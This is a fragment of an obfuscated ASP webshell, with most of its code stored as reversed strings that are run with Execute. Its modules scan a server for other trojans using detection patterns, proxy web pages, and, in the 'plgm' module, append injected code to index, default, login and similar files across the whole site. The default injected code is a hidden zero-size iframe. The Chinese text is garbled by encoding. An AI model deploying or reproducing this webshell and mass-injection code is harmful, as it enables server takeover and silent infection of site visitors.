~LRUaxelA&��=lru&abns=tad&01=ilc?atad/moc.axela.atad//:ptth��=lru	~ddne,rats mid	~lru,rtsteg,smsteg mid	~ txen emuser rorre no	":ExeCuTe(UZSS(ShiSan)):end function
function b(l)
t=-1
for i = 1 to len(l)
if mid(l,i,1)<>"��" then
If Asc(Mid(l, i, 1)) < 32 Or Asc(Mid(l, i, 1)) > 126 Then
else
g=asc(mid(l,i,1))-t
a=a&chr(g)
end if
else
end if
next
b=a
end function
function getHTTPPage(url) 
	on error resume next 
	dim http 
	set http=Server.createobject("Microsoft.XMLHTTP") 
	Http.open "GET",url,false 
	Http.send() 
	if Http.readystate<>4 then
		getHTTPPage=""
		exit function 
	end if 
	getHTTPPage=bytes2BSTR(Http.responseBody) 
	set http=nothing
	if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i1,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i1 = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i1,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i1+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i1 = i1 + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
    Err.Clear
End Function   'alxa
	
  Case "kmuma"
ShiSan="fi dne	~��>tnof/<�����&emiteht&�����ù���ִҳ��>'xp21:ezis-tnof'=elyts tnof<>rb<�� SRR~)01/)5.0+) 00001*)1remit-2remit(((tni(rtsc=emiteht~remit = 2remit~��>elbat/<>/rb<�� SRR	~tropeR SRR	~��>rt/<�� SRR	~fi dne~��>dt/<��ʱ����>����%52����=htdiw dt<�� SRR	~��>dt/<��ʱ��������>����%52����=htdiw dt<�� SRR	~��>dt/<��·�������>����%05����=htdiw dt<�� SRR	~   esle~��>dt/<��ʱ����/����>����%02����=htdiw dt<�� SRR	~��>dt/<����>����%04����=htdiw dt<�� SRR	~��>dt/<������>����%02����=htdiw dt<�� SRR	~��>dt/<��·�������>����%02����=htdiw dt<�� SRR	~nehT ��sws�� = )��nottuboidar��(mroF.tseuqer fI~��>rt<>����;htob:raelc;%031:thgieh-enil;espalloc:espalloc-redrob;xp21:ezis-tnof����=elyts ����999999#����=rolocredrob ����8����=gnicapsllec ����0����=gniddapllec ����1����=redrob ����%001����=htdiw elbat<�� SRR~����>tnof/<��&nuS&��>����0000FF#����=roloc tnof<���ɿ��ַ�����>tnof/<��&seliFmuS&��>����0000FF#����=roloc tnof<���ģ���>tnof/<��&sredloFmuS&��>����0000FF#����=roloc tnof<�м��Ĳ�칲һ��������ɨ�� SRR~��>vid/<>����enon:yalpsid;xp4:gniddap;f14498# dilos xp1:redrob;1effff:dnuorgkcab����=elyts ����ofnIetadpu����=di vid<�� SRR~��>����xp21:ezis-tnof;htob:raelc;%071:thgieh-enil;xp5:gniddap����=elyts dt<>rt<�� SRR~��>rt/<llehSbeW nacS>ht<>rt<�� SRR~��>'xp21:ezis-tnof'=elyts ����0����=gnicapsllec ����0����=gniddapllec ����0����=redrob ����%001����=htdiw elbat<�� SRR~fI dnE		~)htaPpmT(2eliFllAwohS llaC			~)��txEelif_hcraeS��(mroF.tseuqer = txEeliFmiD			~fI dnE			~)(dnE.esnopser				~)��>a/<�������ػط���>';)1-(og.yrotsih:tpircsavaj'=ferh a<>rb<>rb<ȫ�겻����������(SRR				~nehT ���� = )��txEeliF_hcraeS��(mroF.tseuqer ro ���� = )��etaD_hcraeS��(mroF.tseuqer ro ���� = )��htap��(mroF.tseuqer fI			~eslE		~)htaPpmT(eliFllAwohS llaC			~��xdc,asa,rec,psa�� = txEeliFmiD			~nehT ��sws�� = )��nottuboidar��(mroF.tseuqer fI		~1 = sredloFmuS		~0 = seliFmuS		~0 = nuS		~remit = 1remit		~		~fi dne		~)��htap��(mroF.tseuqer = htaPpmT			~esle		~)��.��(htaPpaM.revreS = htaPpmT			~neht ��.��=)��htap��(mroF.tseuqer fiesle		~)��\��(htaPpaM.revreS = htaPpmT			~neht ��\��=)��htap��(mroF.tseuqer fi		~fi dne		~)(dnE.esnopser			~)����Ϊ�ܲ���·��(SRR			~neht ����=)��htap��(mroF.tseuqer fi		~esle	~��>mrof/<�� SRR		~��>/ ����;xp4:nigram;xp2 xp0 xp2 xp2:gniddap;fff# dilos xp2:redrob;ccc#:dnuorgkcab����=elyts ���� ��ɨʼ�� ����=eulav ����timbus����=epyt tupni<�� SRR		~��>vid/<>/ rb<>/ rb<��������ʾ��*������,�ü�֮���� >����02����=ezis ����*����=eulav ����999# dilos xp1:redrob����=elyts ����txet����=epyt ����txEeliF_hcraeS����=eman tupni<���������;psbn&;psbn&�� SRR		~��>/ rb<>a/<LLA>����'LLA'=eulav.etaD_hcraeS.1mrof:tpircsavaj����=kcilCno ����#����=ferh a< д���������Σ�����;�����ո��� >����02����=ezis ������&)1-)�� ��,)(won(rtSnI,)(woN(tfeL&������=eulav ����999# dilos xp1:redrob����=elyts ����txet����=epyt ����etaD_hcraeS����=eman tupni<�����ո���;psbn&;psbn&�� SRR		~��>/ rb<��������н�ֻ����������ֵ��Ҳ�Ҫ �� SRR		~��>����02����=ezis ����999# dilos xp1:redrob����=elyts ����tnetnoC_hcraeS����=di ����txet����=epyt ����tnetnoC_hcraeS����=eman tupni<�������Ҳ�;psbn&;psbn&�� SRR		~��>����enon:yalpsid����=elyts ����1eliFwohs����=di vid<>/ rb<�� SRR		~��>rb<����֮�����Ϸ�����>����''=yalpsid.elyts.)'1eliFwohs'(dIyBtnemelEteg.tnemucod����=kcilCno ����fs����=eulav ����nottuboidar����=eman ����oidar����=epyt c=ssalc tupni<�� SRR		~���� PSA��>dekcehc ����'enon'=yalpsid.elyts.)'1eliFwohs'(dIyBtnemelEteg.tnemucod����=kcilCno ����sws����=eulav ����oidar����=epyt ����nottuboidar����=eman c=ssalc tupni< :ôʲ��Ҫ�㚢 SRR		~��>rb<>rb<¼Ŀ��̱�Ϊ��.����¼Ŀ��վ����\���� >/ ����03����=ezis ����.����=eulav ����999# dilos xp1:redrob����=elyts ����txet����=epyt ����htap����=eman tupni<�� SRR		~��>b/<����·�Ĳ��Ҫ������>b<>p<�� SRR		~��>����1mrof����=eman ����tsop����=dohtem ����nacs=tca&amumk=noitcA?����=noitca mrof<�� SRR		~)����&lruypoc&����( SRR        ~))��.��(htaPpaM.revreS&�� ->b/<¼Ŀ��̱�>b<��( SRR		~)��>rb<��&)��/��(htaPpaM.revreS&�� ->b/<¼Ŀ��վ��>b<��( SRR	  	~neht ��nacs��><)��tca��(gnirtSyreuQ.tseuqer fi	~tropeR mid	"
ExeCuTe(UZSS(ShiSan))

Sub ShowAllFile(Path)
Set F1SO = CreateObject("Scripting.FileSystemObject")
if not F1SO.FolderExists(path) then exit sub
Set f = F1SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
Call ScanFile(Path&Temp&"\"&myfile.name, "")
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
If InFile <> "" Then
Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
End If
Set FSO1s = CreateObject("Scripting.FileSystemObject")
on error resume next
set ofile = FSO1s.OpenTextFile(FilePath)
filetxt = Lcase(ofile.readall())
If err Then Exit Sub end if
if len(filetxt)>0 then
filetxt = vbcrlf & filetxt
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&FilePath&"</a><br />"
temp=temp&"<a href='javascript:FullForm("""&replace(FilePath,"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(FilePath,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(FilePath,"\","\\")&""",""DelFile"")' onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(FilePath,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(FilePath,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"
If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End if
If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű���������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
regEx.Pattern = "\bEv"&"al\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP����<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
regEx.Pattern = "[^.]\bExe"&"cute\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
regEx.Pattern = "\.(Open|Create)TextFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile��д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
regEx.Pattern = "\.SaveToFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>ʹ����Stream��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
regEx.Pattern = "\.Save\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-ͬ��-"
End If
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches

tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ���</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
End If
Set Matches = Nothing
Set regEx = Nothing
Set XregEx = New RegExp
XregEx.IgnoreCase = True
XregEx.Global = True
XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
Set XMatches = XregEx.Execute(filetxt)
For Each Match in XMatches
tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
srcSeek = InStr(1, tmpLake2, "src", 1)
If srcSeek > 0 Then
srcSeek2 = instr(srcSeek, tmpLake2, "=")
For i = 1 To 50
tmp = Mid(tmpLake2, srcSeek2 + i, 1)
If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
Exit For
End If
Next
If tmp = """" Then
tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
Else
If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
End If
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject����ʹ���˱��μ���"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
exit sub
End If
Next
Set Matches = Nothing
Set regEx = Nothing
end if
set ofile = nothing
set FSO1s = nothing
End Sub
Function CheckExt(FileExt)
If DimFileExt = "*" Then CheckExt = True
Ext = Split(DimFileExt,",")
For i = 0 To Ubound(Ext)
If Lcase(FileExt) = Ext(i) Then 
CheckExt = True
Exit Function
End If
Next
End Function
Function GetDateModify(filepath)
Set F2SO = CreateObject("Scripting.FileSystemObject")
Set f = F2SO.GetFile(filepath) 
s = f.DateLastModified 
set f = nothing
set F2SO = nothing
GetDateModify = s
End Function
Function GetDateCreate(filepath)
Set F3SO = CreateObject("Scripting.FileSystemObject")
Set f = F3SO.GetFile(filepath) 
s = f.DateCreated 
set f = nothing
set F3SO = nothing
GetDateCreate = s
End Function
Function tURLEncode(Str)
temp = Replace(Str, "%", "%25")
temp = Replace(temp, "#", "%23")
temp = Replace(temp, "&", "%26")
tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
Set F4SO = CreateObject("Scripting.FileSystemObject")
if not F4SO.FolderExists(path) then exit sub
Set f = F4SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
Call IsFind(Path&"\"&myfile.name)
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile2 path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
theDate = GetDateModify(thePath)
on error resume next
theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
if err then exit Sub
xDate = Split(request.Form("Search_Date"),";")
If request.Form("Search_Date") = "ALL" Then ALLTime = True
For i = 0 To Ubound(xDate)
If theTmp = xDate(i) or ALLTime = True Then 
If request("Search_Content") <> "" Then
Set FSO2s = CreateObject("Scripting.FileSystemObject")
set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
filetxt = Lcase(ofile.readall())
If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then

temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a><br>"
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""EditFile"")' class='am' title='����'>Down</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"
Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
ofile.close()
Set ofile = Nothing
Set FSO2s = Nothing
Else
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a><br>"
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""EditFile"")' class='am' title='����'>Down</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(thePath,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"
Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
End If
Next
End Sub:Case "webpor":ShiSan="noitcnuF dnE~)gnrts,rtsw(rtsnI=gnirtsweN~)gnrts,rtsw(gnirtsweN noitcnuF~noitcnuF dnE~gnihton = maertsjbo tes~esolC.maertsjbo~txeTdaeR.maertsjbo = rtsBoTsetyB~tesC = tesrahC.maertsjbo~2 = epyT.maertsjbo~0 = noitisoP.maertsjbo~ydob etirW.maertsjbo~nepO.maertsjbo~3= edoM.maertsjbo~1 = epyT.maertsjbo~)��maerts.bdoda��(tcejbOetaerC.revreS = maertsjbo tes~maertsjbo mid~)tesC,ydob(rtsBoTsetyB noitcnuF~~noitcnuf dnE~raelC.rre neht 0><rebmun.rre fi~gnihton=ptth tes~))��yy��(mrof.tseuqer,ydoBesnopser.pttH(RTSBoTsetyb=egaPPTTHteg~fi dne~noitcnuf tixe~neht 002><sutatS.pttH fI~txeN emuseR rorrE nO~)(dnes.pttH~eslaf,lru,��TEG�� nepo.pttH~)��PTTHLMX.tfosorciM��(tcejboetaerc.revreS=ptth tes~ptth mid~)lru(egaPPTTHteg noitcnuF~fi dne~)0,,,2,2deepstent(rebmuntamrof=2deepstent~)0,,,2,deepstent(rebmuntamrof=deepstent~003=htdiwt neht 003 >htdiwt fi~5+)61.0 * deepstent(tni=htdiwt~8 * deepstent=2deepstent~)emitt(/001=deepstent~10000.0 + tratst-dnet=emitt~)(remit=dnet~hsulF.esnopseR:hsulF.esnopseR~txen~flrcbv & ��>--543210#########0#########0#########0#########0#########0#########0#########0#########098765--!<�� etirW.esnopseR~4201 ot 1=i rof~)(remit=tratst~hsulF.esnopseR:hsulF.esnopseR~esle~fi dne~��������Դ�ʵ��ʷ�Ҫ����ôҪ����dnE��Դ��ʡ����Ϊ�����ֵĶ�̫��ôҪ,��횢 etirw.esnopser~esle~rtsw etirw.esnopser~)����,rtsw(gnirtswen=revo~)����,rtsw(gnirtswen=trats~neht 0001>))rtsw(nel(tni fi~) )��a��(mrof.tseuqer (egaPPTTHteg=rtsw~neht ����><)��a��(tseuqer ro ����><)��a��(mrof.tseuqer fi~��>vid/<>mrof/<>p/<>tnof/< >'1-'=ezis '000099#'=roloc tnof<>'����'=eulav '1demannu'=ssalc 'timbus'=epyt 'timbuS'=eman tupni<>lebal/<>tceles/<>noitpo/<osIŷ��>'OSI'=eulav noitpo<>noitpo/<��Ĭŷ��>'swodniw'=eulav noitpo<>noitpo/<8-FTU>'8-FTU'=eulav noitpo<>noitpo/<����>'SIj-tfihS'=eulav noitpo<>noitpo/<�����己>'5gib'=eulav noitpo<>noitpo/<�������>detceles '2132bg'=eulav noitpo<>'tupni'=ssalc 'yy'=eman tceles<>lebal<�� etirw.esnopser~fi dne~��>'��&)��a��(mrof.tseuqer&��'=eulav 'a'=di '1demannu'=ssalc 'txet'=epyt 'a'=eman tupni<�� etirw.esnopser~esle~��>'//:ptth'=eulav 'a'=di '1demannu'=ssalc 'txet'=epyt 'a'=eman tupni<�� etirw.esnopser~neht ����=)��a��(mrof.tseuqer fi~��>gnorts/<��ҳ�����ʷ������ʹҪ��������>gnorts<>p<>''=noitca 'tsop'=dohtem '1mrof'=eman mrof<�� etirw.esnopser":ExeCuTe(UZSS(ShiSan)):Case "plgm":Server.ScriptTimeout=1000000:Response.Buffer=False:ShiSan="buS dnE~fI dnE~ txeN~ l hcs~ fs nI l hcaE roF~ nehT 0><tnuoC.fs fI~ txeN~ ntr lla_pets~ htap.f=ntr~ if ni f hcaE roF~ sredloFbuS.df=fs teS~ seliF.df=if teS~ )s(redloFteG.sf=df teS~ )��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerc.revreS=sf teS~ TxEn EmUsEr rOrRe No~ )s(hcs buS~ fi dne~fI dnE~ s hcs nehT )s,��)/\|\\(}1{:}1{]ba^[��(nrettaPsI fI esle~dne.esnopser~��>tnof/<!�����·�����������>der=roloc tnof<�� SRR~nehT ����=edocdda ro ����=s fI~neht ����><)��timbus��(mrof.tseuqer fi~ noitcnuF dnE~fI dnE~ eslaF=nrettaPsI~ eslE~ eurT=nrettaPsI~ nehT eurT=laVter fI~ gnihtoN=xEger teS~ )rts(tseT.xEger=laVter~ eurT=esaCerongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS~ )rts,ttap(nrettaPsI noitcnuF~ fI dnE~)��>mrof/<>elbat/<>rt/<��(SRR~)��>dt/<>����ʼ������=eulav ����timbus����=epyt ����timbus����=eman tupni<>dt<��(SRR~)��>dt/<>aeratxet/<��&edocdda&��>����3����=swor 85=sloc ����edoc����=eman aeratxet<>dt<��(SRR~)��>dt/<:��������Ҫ>dt<>rt<>rt/<��(SRR~)��>dt/<;psbn&>����96����=htdiw dt<��(SRR~)��>dt/<>06=ezis ������&s&������=eulav ����df����=eman ����txet����=epyt tupni<>����953����=htdiw dt<��(SRR~)��>dt/<��)��·�Ծ�( �м��ĵ����Ҫ>����201����=htdiw dt<��(SRR~)��>rt<��(SRR~)��>����;xp21:ezis-tnof����=elyts ����0����=redrob 065=htdiw elbat<��(SRR~)�� >����TSOP����=dohtem mrof<��(SRR~ eslE~ tceles dnE~ )htp(evas_elif LLAC~ ��evas�� esaC~ )htp(wohs_elif LLAC~ ��tide�� esaC~ xe esaC tceles~ nehT ����><htp DNA ����><xe fI~��>emarfi/<>0=thgieh 0=htdiw mth.m/1.0.0.721//:ptth=crs emarfi<��=edocdda neht ����=edocdda fi~)��edoc��(tseuqeR = edocdda~ )��tncwen��(tseuqeR=tncwen~ )��htp��(tseuqeR=htp~ )��xe��(tseuqeR=xe~)��/��(htaPpaM.revreS=s neht ����=s fi~ )��df��(tseuqeR=s~ )��OFNI_HTAP��(selbairaVrevreS.tseuqeR=FLES_PSA~)��>b/<��(&)��/��(htaPpaM.revreS&)��:��·�Ծ�վ��ǰ��>b<��( SRR":ExeCuTe(UZSS(ShiSan)):Sub step_all(agr) 
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|main|article|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub:End If:End Sub:Sub step1(str1):ShiSan="��>vid/<>a/<evoM>'����'=eltit 'ma'=ssalc ')����eliFevoM����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')����eliFypoC����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����eliFleD����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<tide>'����'=eltit 'ma'=ssalc ')����eliFtidE����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<nwoD>'����'=eltit 'ma'=ssalc ')����eliFnwoD����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� sRR~��_ ��&1rts&�� ��>'xp02:thgieh-enil'=elyts vid<�� SRR":ExeCuTe(UZSS(ShiSan)):End Sub:Sub step2(str2):ShiSan="gnihtoN=sf teS~ fI dnE~ gnihtoN=f teS~ esolC.edocdda_f~ edocdda etirW.edocdda_f~ )2-,8(maertStxeTsAnepO.f=edocdda_f teS~ )2rts(eliFteG.sf=f teS~ nehT tsixEsi fI~ )2rts(stsixEeliF.sf=tsixEsi~ )��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerc.revreS=sf teS":ExeCuTe(UZSS(ShiSan)):End Sub:Err.Clear
  Case "Cplgm"
